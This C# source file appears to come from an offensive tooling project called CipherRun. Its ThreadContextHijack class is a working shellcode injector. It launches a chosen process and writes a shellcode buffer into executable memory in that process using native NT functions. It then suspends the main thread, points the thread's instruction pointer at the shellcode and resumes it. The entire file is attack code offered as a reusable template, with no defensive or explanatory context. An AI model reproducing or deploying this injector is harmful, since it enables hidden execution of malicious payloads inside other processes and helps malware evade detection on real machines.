using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static CipherRun.Data.Structs;
using static CipherRun.Helpers.Methods;
using static CipherRun.Data.Enums;


namespace CipherRun.Templates
{
    /// <summary>
    /// The Inject Method takes a process name and a shellcode buffer , starts the process and hijack its main thread
    /// </summary>
    public class ThreadContextHijack
    {


        public static void Inject(string processname, byte[] shellcode) {
            Process process = new Process();
            process.StartInfo.FileName = processname;
            Console.WriteLine($"[*] starting process: {process.StartInfo.FileName}");
            process.Start();

            uint pid = (uint)process.Id;
            ProcessThread Thread = process.Threads[0];
            Console.WriteLine($"[*] PID: {pid}");
            Console.WriteLine($"[*] ThreadID: {Thread.Id}");

            const ulong MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000;
            const ulong PAGE_READ_RIGHT_EXECUTE = 0x40;
            const uint THREAD_ALL_ACCESS = 0x1F03FF;

            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)), // an OBJECT_ATTRIBUTES struct must be initialized to its own size
                ObjectName = IntPtr.Zero,
                Attributes = 0,
            };
           
            CLIENT_ID ci = new();

            ci.UniqueThread = new IntPtr(Thread.Id);

            IntPtr thHandle = IntPtr.Zero; 
            NTSTATUS status = NtOpenThread(ref thHandle,THREAD_ALL_ACCESS, ref oa, ref ci);
            IntPtr AllocatedMemory = IntPtr.Zero;
            IntPtr size = new IntPtr(shellcode.Length);
            uint n = 0;
            int optional_value=0;

            NtAllocateVirtualMemory(process.Handle, ref AllocatedMemory, IntPtr.Zero, ref size, (uint)MEM_COMMIT_RESERVE, (uint)PAGE_READ_RIGHT_EXECUTE);

            NtWriteVirtualMemory(process.Handle, AllocatedMemory, shellcode, (uint)shellcode.Length, ref n);

            NtSuspendThread(thHandle, ref optional_value);

            CONTEXT64 ctx = new();
            ctx.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;

            NtGetContextThread(thHandle, ref ctx);
            ctx.Rip = (ulong)AllocatedMemory.ToInt64();

            NtSetContextThread(thHandle, ref ctx);

            NtResumeThread(thHandle, ref optional_value);


        }

    }
}
